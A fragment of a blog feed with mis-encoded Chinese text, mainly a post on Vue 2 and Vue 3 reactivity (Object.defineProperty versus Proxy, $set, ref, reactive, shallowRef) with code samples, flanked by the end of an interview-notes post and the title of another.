      <content type="html"><![CDATA[<h1 id="HRé¢"><a href="#HRé¢" class="headerlink" title="HRé¢"></a>HRé¢</h1><h3 id="é¢è¯•æ—¶ï¼Œå¦‚ä½•å‘å…¬å¸æé—®ï¼Ÿ"><a href="#é¢è¯•æ—¶ï¼Œå¦‚ä½•å‘å…¬å¸æé—®ï¼Ÿ" class="headerlink" title="é¢è¯•æ—¶ï¼Œå¦‚ä½•å‘å…¬å¸æé—®ï¼Ÿ"></a>é¢è¯•æ—¶ï¼Œå¦‚ä½•å‘å…¬å¸æé—®ï¼Ÿ</h3><ul><li>ä½ ä»¬ä¸ºä»€ä¹ˆè¦æ‹›è˜è¿™ä¸ªèŒä½ï¼Ÿ</li></ul><h3 id="æ€§æ ¼æ€æ ·"><a href="#æ€§æ ¼æ€æ ·" class="headerlink" title="æ€§æ ¼æ€æ ·"></a>æ€§æ ¼æ€æ ·</h3><p>INTJï¼ˆå†…å‘ã€ç›´è§‰ã€æ€è€ƒã€å–œæ¬¢åšè®¡åˆ’ï¼‰<br>Iï¼šä»ç‹¬å¤„å’Œæ€è€ƒä¸­è·å¾—èƒ½é‡ï¼Œå¯¹ç¤¾äº¤æ´»åŠ¨æ„Ÿåˆ°æ¶ˆè€—ã€‚è€Œä¸æ˜¯ä¸èƒ½ç¤¾äº¤<br>Nï¼šç›´è§‰ï¼Œå–œæ¬¢æŠ½è±¡æ¦‚å¿µã€äº‹ä»¶é—´çš„è”ç³»</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” Vueå“åº”å¼é—®é¢˜é›†</title>
      <link href="/2025/02/17/Vue-%E5%93%8D%E5%BA%94%E5%BC%8F/"/>
      <url>/2025/02/17/Vue-%E5%93%8D%E5%BA%94%E5%BC%8F/</url>
      <content type="html"><![CDATA[<blockquote><p>ä¸€ä¸ªVueçš„å¤æ‚å“åº”å¼å¯¹è±¡éƒ½åŠ«æŒäº†å“ªäº›keyï¼Ÿå“ªäº›å±æ€§æ˜¯å“åº”å¼çš„ï¼Ÿå¦‚æœæŠŠè¿™ä¸ªkeyæŠ½ç¦»å‡ºæ¥ï¼Œè¿˜æœ‰å“åº”å¼å—ï¼Ÿä»€ä¹ˆæƒ…å†µä¸‹ä¼šå‡ºç°å“åº”å¼ä¸¢å¤±ï¼Ÿä¸ºä»€ä¹ˆ Vue2 é‡Œä¼šæœ‰<code>$set</code> æ–¹æ³•ï¼Ÿä¸ºä»€ä¹ˆ Vue3 é‡Œä¼šæœ‰ <code>toRef</code>, <code>.value</code>ï¼Ÿ<code>Ref</code>, <code>Reactive</code>, <code>shallowRef</code>çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ<br>ï¼ˆåˆšè¢«é¢è¯•å®˜é—®å¾—æˆ‘ä¸€æ„£ä¸€æ„£çš„ï¼ŒVueçš„å“åº”å¼æ€ä¹ˆè¿™ä¹ˆå¤šé—®é¢˜ -_-||ï¼‰</p></blockquote><p><br></p><h3 id="1-Object-defineProperty"><a href="#1-Object-defineProperty" class="headerlink" title="1. Object.defineProperty"></a>1. Object.defineProperty</h3><h4 id="1-1-å®ç°å“åº”å¼"><a href="#1-1-å®ç°å“åº”å¼" class="headerlink" title="1.1 å®ç°å“åº”å¼"></a>1.1 å®ç°å“åº”å¼</h4><p>Vue2ä½¿ç”¨<code>Object.defineProperty(obj, key, handlers)</code>å®ç°å“åº”å¼ã€‚è¿™ä¸ªæ–¹æ³•å¿…é¡»æŒ‡å®š<code>key</code>é”®ï¼Œåœ¨ç»„ä»¶åˆå§‹åŒ–æ—¶ï¼Œvue2 ä¼šæ·±åº¦éå†dataçš„æ¯ä¸ªkeyè¿›è¡ŒåŠ«æŒã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reactive</span>(<span class="params">raw</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">Object</span>.keys(raw).forEach(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = <span class="keyword">new</span> Dep()</span><br><span class="line">    <span class="keyword">let</span> value = raw[key]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(raw, key, &#123;</span><br><span class="line">      get() &#123;</span><br><span class="line">        dep.depend()</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">      &#125;,</span><br><span class="line">      set(newValue) &#123;</span><br><span class="line">        value = newValue</span><br><span class="line">        dep.notify()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> raw</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-Vue2éƒ½åŠ«æŒäº†å“ªäº›key"><a href="#1-2-Vue2éƒ½åŠ«æŒäº†å“ªäº›key" class="headerlink" title="1.2 Vue2éƒ½åŠ«æŒäº†å“ªäº›key?"></a>1.2 Vue2éƒ½åŠ«æŒäº†å“ªäº›key?</h4><p>dataçš„ç¬¬ä¸€å±‚keyéƒ½è¢«åŠ«æŒåˆ°ï¼Œå¦‚æœæŸä¸€ä¸ªkeyçš„valueæ˜¯å¯¹è±¡å’Œæ•°ç»„ã€‚æˆ‘ä»¬æ“ä½œ<code>this.$data.a.b = 1</code>ä¼šæœ‰å“åº”å¼æ•ˆæœå—ï¼Ÿ</p><p><em>å¯¹è±¡</em><br>å¯¹å¯¹è±¡çš„å­å±æ€§è¿›è¡Œæ·±åº¦éå†ç›‘å¬</p><p><em>æ•°ç»„</em><br>Vue æ²¡æœ‰å¯¹æ¯ä¸ªæ•°ç»„é¡¹è®¾ç½®ç›‘å¬ï¼Œä½†æ˜¯å¦‚æœæ•°ç»„é¡¹æ˜¯å¯¹è±¡ï¼ŒVueè¿˜æ˜¯ç»™è¿™ä¸ªå¯¹è±¡æ‰€æœ‰keyç›‘å¬äº†ã€‚</p><p><em>æ€»ç»“</em><br>æ‰€ä»¥ä½ å¯ä»¥ç†è§£ï¼Œé¢å¯¹å¤æ‚å¯¹è±¡ã€æ•°ç»„ï¼ŒVueæ²¡æœ‰å¯¹æ•°ç»„ç´¢å¼•ä¸‹æ ‡ï¼ˆè¿™ä¸ªkeyï¼‰æ·»åŠ ç›‘å¬ï¼Œå…¶ä»–éƒ½ç›‘å¬äº†ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      list: [</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        &#123; <span class="attr">name</span>: <span class="number">1</span> &#125;,</span><br><span class="line">        [</span><br><span class="line">          &#123; <span class="attr">name</span>: <span class="number">1</span> &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    changeList () &#123;</span><br><span class="line">      <span class="keyword">this</span>.list[<span class="number">0</span>] = <span class="number">2</span>          <span class="comment">// ä¸ä¼šè§¦å‘æ¸²æŸ“</span></span><br><span class="line">      <span class="keyword">this</span>.list[<span class="number">1</span>] = <span class="number">1</span>          <span class="comment">// ä¸ä¼šè§¦å‘æ¸²æŸ“</span></span><br><span class="line">      <span class="keyword">this</span>.list[<span class="number">1</span>].name = <span class="number">2</span>     <span class="comment">// ä¼šè§¦å‘æ¸²æŸ“</span></span><br><span class="line">      <span class="keyword">this</span>.list[<span class="number">2</span>][<span class="number">0</span>] = <span class="number">3</span>       <span class="comment">// ä¸ä¼šè§¦å‘æ¸²æŸ“</span></span><br><span class="line">      <span class="keyword">this</span>.list[<span class="number">2</span>][<span class="number">0</span>].name = <span class="number">3</span>  <span class="comment">// ä¼šè§¦å‘æ¸²æŸ“</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-3-æºç è§£æ"><a href="#1-3-æºç è§£æ" class="headerlink" title="1.3 æºç è§£æ"></a>1.3 æºç è§£æ</h4><p>é™¤äº†å®ç°ä¸Šé¢çš„æ•ˆæœã€‚å¦‚æœnewValæ˜¯ä¸€ä¸ªå…¨æ–°çš„å€¼ï¼Œç´¢å¼•åœ°å€å˜äº†ï¼Œä¼šé‡æ–°è§¦å‘Object.defineProperty<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æºç åœ°å€ï¼šsrc/core/observer/index.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">observe</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Observer(value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (value) &#123;    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">      <span class="comment">// å˜é‡æ˜¯æ•°ç»„ï¼Œéå†æ•°ç»„ï¼Œå¦‚æœæ•°ç»„é‡Œçš„å…ƒç´ æ˜¯å¯¹è±¡ï¼Œå°±ä¸ºå¯¹è±¡é‡Œçš„keyè°ƒç”¨Object.defineProperty</span></span><br><span class="line">      <span class="keyword">this</span>.observeArray(value)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// å˜é‡æ˜¯å¯¹è±¡ï¼Œéå†æ‰€æœ‰keyå€¼ï¼Œä¸ºæ¯ä¸ªkeyè°ƒç”¨Object.defineProperty</span></span><br><span class="line">      <span class="keyword">this</span>.walk(value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  walk (obj: <span class="built_in">Object</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(obj)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.length; i++) &#123;</span><br><span class="line">      defineReactive(obj, keys[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  observeArray (items: <span class="built_in">Array</span>&lt;any&gt;) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, l = items.length; i &lt; l; i++) &#123;</span><br><span class="line">      observe(items[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define a reactive property on an Object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span> (<span class="params">obj, key, val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> childOb = !shallow &amp;&amp; observe(val)</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(obj, key, &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> <span class="title">reactiveGetter</span> (<span class="params"></span>) </span>&#123;&#125;,</span><br><span class="line">    set: <span class="function"><span class="keyword">function</span> <span class="title">reactiveSetter</span> (<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// å¦‚æœnewValæ˜¯ä¸€ä¸ªå…¨æ–°çš„å€¼ï¼Œç´¢å¼•åœ°å€å˜äº†ï¼Œä¼šé‡æ–°è§¦å‘ObjectProperty</span></span><br><span class="line">      childOb = !shallow &amp;&amp; observe(newVal)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-4-å“ªäº›å˜åŠ¨ä¸ä¼šæœ‰å“åº”å¼ï¼Ÿ-set-Array-property"><a href="#1-4-å“ªäº›å˜åŠ¨ä¸ä¼šæœ‰å“åº”å¼ï¼Ÿ-set-Array-property" class="headerlink" title="1.4 å“ªäº›å˜åŠ¨ä¸ä¼šæœ‰å“åº”å¼ï¼Ÿ($set, Array.property)"></a>1.4 å“ªäº›å˜åŠ¨ä¸ä¼šæœ‰å“åº”å¼ï¼Ÿ($set, Array.property)</h4><p>ä»ä¸Šé¢å¾—çŸ¥ï¼Œ<code>Object.defineProperty</code>çš„æ€§è´¨ä½¿å¾—ï¼ŒVueä¸èƒ½ç›‘å¬è¿™äº›å˜åŠ¨ï¼š</p><ul><li>æ·»åŠ æ ¹çº§åˆ«å¯¹è±¡<code>key</code></li><li>å¯¹å·²æœ‰å¯¹è±¡æ·»åŠ åˆ é™¤<code>key</code></li></ul><p>ä¸ºæ¯ä¸ªæ•°ç»„é¡¹è¿›è¡Œç›‘å¬å¼€é”€å¤ªå¤§ï¼Œä½¿å¾—Vueä¸èƒ½ç›‘å¬è¿™äº›å˜åŠ¨ï¼š</p><ul><li>åˆ©ç”¨ç´¢å¼•è®¾ç½®ä¸€ä¸ªæ•°ç»„é¡¹<code>vm.items[index] = newValue</code></li><li>ä¿®æ”¹æ•°ç»„é•¿åº¦<code>vm.items.length = newLength</code></li></ul><p><br></p><p>ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™äº›æ‰‹æ®µï¼Œå¤„ç†è¿™ä¸ªé—®é¢˜</p><ol><li><p>ä¿®æ”¹å†…å­˜åœ°å€ï¼Œèµ‹ä¸€ä¸ªå…¨æ–°çš„å€¼ï¼Œè§¦å‘ä¸€æ¬¡æ–°çš„ç›‘å¬ç»‘å®š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–°å¢ä¿®æ”¹å¯¹è±¡property</span></span><br><span class="line"><span class="keyword">this</span>.someObject = <span class="built_in">Object</span>.assign(&#123;&#125;, <span class="keyword">this</span>.someObject, &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ€»æ˜¯è¿”å›ä¸€ä¸ªæ–°æ•°ç»„</span></span><br><span class="line">filter(), concat(), slice()</span><br></pre></td></tr></table></figure></li><li><p>è°ƒç”¨<code>vm.$set</code>æ–¹æ³•<br>vm.$setåšäº†ä»€ä¹ˆï¼Ÿ<br><code>target</code>æ˜¯æ•°ç»„æ—¶ï¼Œæ‰§è¡Œ<code>target.splice(key, 1, val)</code><br><code>target</code>æ˜¯å¯¹è±¡æ—¶ï¼Œå¦‚æœ<code>key</code>å·²ç»å­˜åœ¨ï¼Œç›´æ¥èµ‹å€¼ï¼›å¦‚æœ<code>key</code>ä¸å­˜åœ¨ï¼Œ<code>defineReactive(ob.value, key, val)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$set(<span class="keyword">this</span>.someObject,<span class="string">'b'</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">this</span>.$set(vm.items, indexOfItem, newValue)</span><br></pre></td></tr></table></figure></li><li><p>è°ƒç”¨æ•°ç»„æ–¹æ³•<br>Vue hackäº† push, pop ç­‰æ•°ç»„çš„åŸå‹æ–¹æ³•<code>Array.prototype</code>ï¼Œä½¿å¾—è°ƒç”¨è¿™äº›æ–¹æ³•ä¹Ÿä¼šäº§ç”Ÿå“åº”å¼æ•ˆæœ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.items.splice(newLength)</span><br><span class="line">push(), pop(), shift(), unshift(), splice(), sort(), reverse()</span><br></pre></td></tr></table></figure></li></ol><p><br></p><h4 id="1-5-watch-deep"><a href="#1-5-watch-deep" class="headerlink" title="1.5 watch deep"></a>1.5 watch deep</h4><p>æ·±åº¦éå†æ‰€æœ‰å­å±æ€§ï¼Œè§¦å‘æ‰€æœ‰å­å±æ€§çš„getterå‡½æ•°æ‰§è¡Œï¼Œæ”¶é›†ä¾èµ–-watchåéœ€è¦æ‰§è¡Œçš„äº‹ä»¶<br><br></p><p><br></p><h3 id="2-Proxy"><a href="#2-Proxy" class="headerlink" title="2. Proxy"></a>2. Proxy</h3><h4 id="2-1-å®ç°å“åº”å¼"><a href="#2-1-å®ç°å“åº”å¼" class="headerlink" title="2.1 å®ç°å“åº”å¼"></a>2.1 å®ç°å“åº”å¼</h4><p>é€šè¿‡ Proxy åŠ«æŒæ•´ä¸ªå¯¹è±¡ï¼ŒåŒ…æ‹¬æ‰€æœ‰æ•°ç»„å’ŒåŠ¨æ€æ·»åŠ çš„å±æ€§ï¼Œæ”¯æŒæ·±åº¦å“åº”å¼ã€‚<br>åœ¨Vue3ï¼Œå¦‚æœreactiveçš„å˜é‡æ˜¯ä¸ªæ•°ç»„ï¼Œå½“ä½ è®¾ç½®<code>arr[index] = 1</code>ï¼Œä¼šè§¦å‘setï¼Œè€Œè®¿é—®ä¼šè§¦å‘getï¼Œä¾èµ–ä¼šè¢«è‡ªåŠ¨æ·»åŠ ã€‚å¯¹äºæ•°ç»„å˜åŒ–ï¼Œå°±ä¸ç”¨åšé¢å¤–çš„å¤„ç†ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> reactiveHandlers = &#123;</span><br><span class="line">  get (target, key, receiver) &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = getDep(target, key)</span><br><span class="line">    dep.depend()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, key, receiver) <span class="comment">// åå°„ï¼Œåšè¯¥å¯¹è±¡æœ¬è¯¥åšçš„äº‹</span></span><br><span class="line">  &#125;,</span><br><span class="line">  set (target, key, value, receiver) &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = getDep(target, key)</span><br><span class="line">    dep.notify()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, key, receiver)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reactive</span>(<span class="params">raw</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(raw, reactiveHandlers)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Proxyçš„å“åº”å¼æ˜¯ç»‘å®šåœ¨å“ªä¸€çº§ï¼Ÿå¦‚æœæˆ‘ä»¬æŠŠobjectä¸­çš„æŸä¸ªkeyæŠ½ç¦»å‡ºæ¥ï¼Œè¿˜æœ‰å“åº”å¼å—ï¼Ÿ</p><p><br></p><h4 id="2-2-Ref-Reactive-shallowRefçš„åŒºåˆ«"><a href="#2-2-Ref-Reactive-shallowRefçš„åŒºåˆ«" class="headerlink" title="2.2 Ref, Reactive, shallowRefçš„åŒºåˆ«"></a>2.2 Ref, Reactive, shallowRefçš„åŒºåˆ«</h4><ul><li><code>Ref</code><br>Refç”¨æ¥åŒ…è£…åŸºæœ¬ç±»å‹æˆ–å¯¹è±¡ï¼Œé€šè¿‡.valueè®¿é—®ï¼Œå“åº”å¼çš„æ˜¯æ•´ä¸ªå€¼çš„å˜åŒ–ã€‚<ul><li>æ•°å­—ã€å­—ç¬¦ä¸²ç­‰åŸºæœ¬ç±»å‹å¿…é¡»ç”¨ refã€‚</li><li>éœ€è¦æ˜ç¡®æ›¿æ¢æ•´ä¸ªå¯¹è±¡æ—¶ä¹Ÿå¯ç”¨ refã€‚</li></ul></li></ul><ul><li><p><code>Reactive</code><br>Reactiveä½¿ç”¨Proxyä»£ç†å¯¹è±¡ï¼Œæ·±åº¦å“åº”å¼ã€‚</p><ul><li>å¤„ç†å¯¹è±¡/æ•°ç»„æ—¶ä¼˜å…ˆä½¿ç”¨ï¼Œè¯­æ³•æ›´ç®€æ´ã€‚</li><li>é¿å…è§£æ„å“åº”å¼å¯¹è±¡ï¼ˆç”¨ toRefs è§£å†³è§£æ„é—®é¢˜ï¼‰ã€‚<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> state = reactive(&#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;);</span><br><span class="line"><span class="keyword">const</span> &#123; a, b &#125; = toRefs(state); <span class="comment">// ä¿æŒå“åº”å¼</span></span><br><span class="line">a.value++; <span class="comment">// è§¦å‘æ›´æ–°</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>shallowRef</code><br>shallowRefåˆ™æ˜¯åªå¯¹.valueçš„å˜åŒ–è§¦å‘å“åº”ï¼Œå†…éƒ¨å€¼ä¸ä¼šè¢«æ·±åº¦å“åº”å¼å¤„ç†ï¼Œé€‚ç”¨äºå¤§å‹å¯¹è±¡æˆ–ä¸éœ€è¦æ·±åº¦ç›‘å¬çš„æƒ…å†µã€‚</p><ul><li>éœ€è¦ç›‘å¬å¼•ç”¨æ›¿æ¢ä½†ä¸éœ€è¦æ·±åº¦å“åº”æ—¶ï¼ˆå¦‚å¤§å‹æ•°æ®ã€ç¬¬ä¸‰æ–¹ç±»å®ä¾‹ï¼‰ã€‚</li><li>éœ€è¦æ‰‹åŠ¨æ§åˆ¶æ›´æ–°ç²’åº¦æ—¶ã€‚</li></ul></li></ul><p><br></p><h4 id="2-3-ä¸ºä»€ä¹ˆéœ€è¦-value"><a href="#2-3-ä¸ºä»€ä¹ˆéœ€è¦-value" class="headerlink" title="2.3 ä¸ºä»€ä¹ˆéœ€è¦.value"></a>2.3 ä¸ºä»€ä¹ˆéœ€è¦<code>.value</code></h4><p><br></p><h4 id="2-4-ä¸ºä»€ä¹ˆéœ€è¦toRef"><a href="#2-4-ä¸ºä»€ä¹ˆéœ€è¦toRef" class="headerlink" title="2.4 ä¸ºä»€ä¹ˆéœ€è¦toRef"></a>2.4 ä¸ºä»€ä¹ˆéœ€è¦<code>toRef</code></h4><p><br></p><h4 id="2-5-å“åº”å¼ä¸¢å¤±"><a href="#2-5-å“åº”å¼ä¸¢å¤±" class="headerlink" title="2.5 å“åº”å¼ä¸¢å¤±"></a>2.5 å“åº”å¼ä¸¢å¤±</h4><h4 id="2-6-ä¸ºä»€ä¹ˆè¦ç”¨ref"><a href="#2-6-ä¸ºä»€ä¹ˆè¦ç”¨ref" class="headerlink" title="2.6 ä¸ºä»€ä¹ˆè¦ç”¨ref()"></a>2.6 ä¸ºä»€ä¹ˆè¦ç”¨<code>ref()</code></h4><p>Vue 3 çš„å“åº”å¼ç³»ç»Ÿæœ¬èº«æœ€å¤§çš„ç‰¹ç‚¹æ˜¯ä¸ä»…ä¸ä¾èµ–ç¼–è¯‘ï¼Œè€Œä¸”è·Ÿç»„ä»¶ä¸Šä¸‹æ–‡æ— å…³ï¼Œç”šè‡³è·Ÿ Vue æ¡†æ¶å…¶å®ƒéƒ¨åˆ†ä¹Ÿæ˜¯è§£è€¦çš„ã€‚åŒä¸€å¥—ç³»ç»Ÿä½ å¯ä»¥ç”¨åœ¨ Vue ç»„ä»¶é‡Œï¼Œç»„ä»¶å¤–ï¼Œå…¶ä»–æ¡†æ¶é‡Œï¼Œç”šè‡³ç”¨åœ¨åç«¯ã€‚</p><p><br></p><h3 id="3-Object-defineProperty-å’Œ-Proxyçš„åŒºåˆ«"><a href="#3-Object-defineProperty-å’Œ-Proxyçš„åŒºåˆ«" class="headerlink" title="3. Object.defineProperty å’Œ Proxyçš„åŒºåˆ«"></a>3. Object.defineProperty å’Œ Proxyçš„åŒºåˆ«</h3><p><em>Proxy</em></p><ul><li>åŠ«æŒæ–¹å¼ï¼šä»£ç†æ•´ä¸ªå¯¹è±¡ï¼Œåªéœ€åšä¸€å±‚ä»£ç†å°±å¯ä»¥ç›‘å¬å¯¹è±¡ä¸‹çš„æ‰€æœ‰å±æ€§å˜åŒ–ï¼ŒåŒ…æ‹¬æ–°å¢å±æ€§å’Œåˆ é™¤å±æ€§ã€æ•°ç»„å˜æ›´</li><li>ä¾èµ–æ”¶é›†æ—¶æœºï¼š</li><li>æœ¬è´¨ï¼šProxy æœ¬è´¨ä¸Šå±äºå…ƒç¼–ç¨‹éç ´åæ€§æ•°æ®åŠ«æŒï¼Œåœ¨åŸå¯¹è±¡çš„åŸºç¡€ä¸Šè¿›è¡Œäº†åŠŸèƒ½çš„è¡ç”Ÿè€Œåˆä¸å½±å“åŸå¯¹è±¡</li><li>Proxy æ‹¦æˆªæ–¹å¼æ›´å¤š, Object.defineProperty åªæœ‰ get å’Œ set</li><li>Proxy å…¼å®¹æ€§å·®</li></ul><p><em>Object.defineProperty</em></p><ul><li>åŠ«æŒæ–¹å¼ï¼šåªèƒ½æ·±åº¦éå†åŠ«æŒå¯¹è±¡çš„keyï¼Œæ— æ³•åŠ«æŒæ•°ç»„ç´¢å¼•ä¸‹æ ‡(0, 1, 2â€¦)</li><li>æµç¨‹ï¼šgetä¸­è¿›è¡Œä¾èµ–æ”¶é›†ï¼Œsetæ•°æ®æ—¶é€šçŸ¥è®¢é˜…è€…æ›´æ–°</li><li>å­˜åœ¨çš„é—®é¢˜ï¼šè™½ç„¶ Object.defineProperty é€šè¿‡ä¸ºå±æ€§è®¾ç½® getter/setter èƒ½å¤Ÿå®Œæˆæ•°æ®çš„å“åº”å¼ï¼Œä½†æ˜¯å®ƒå¹¶ä¸ç®—æ˜¯å®ç°æ•°æ®çš„å“åº”å¼çš„å®Œç¾æ–¹æ¡ˆï¼ŒæŸäº›æƒ…å†µä¸‹éœ€è¦å¯¹å…¶è¿›è¡Œä¿®è¡¥æˆ–è€…hackï¼Œè¿™ä¹Ÿæ˜¯å®ƒçš„ç¼ºé™·ï¼Œä¸»è¦è¡¨ç°åœ¨ä¸¤ä¸ªæ–¹é¢ï¼š<ul><li>æ— æ³•ç›‘å¬æ–°å¢åŠ çš„å±æ€§</li><li>æ— æ³•ä¸€æ¬¡æ€§ç›‘å¬å¯¹è±¡æ‰€æœ‰å±æ€§ï¼Œå¦‚å¯¹è±¡å±æ€§çš„å­å±æ€§</li><li>æ— æ³•å“åº”æ•°ç»„çš„æ“ä½œ</li></ul></li></ul><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.zhihu.com/question/492260571/answer/2169614031" target="_blank" rel="noopener">ä¸ºä»€ä¹ˆ vue3 åˆ ä¸æ‰ ref() è¿™æ ·å†—ä½™çš„å‡½æ•°ï¼Œä½† svelte å¯ä»¥ï¼Ÿ</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ä»¿è±†åŒ…Â·æ™ºèƒ½è¾“å…¥æ¡†å®ç°</title>
      <link href="/2025/02/13/%E5%A4%8D%E6%9D%82%E8%BE%93%E5%85%A5%E6%A1%86/"/>
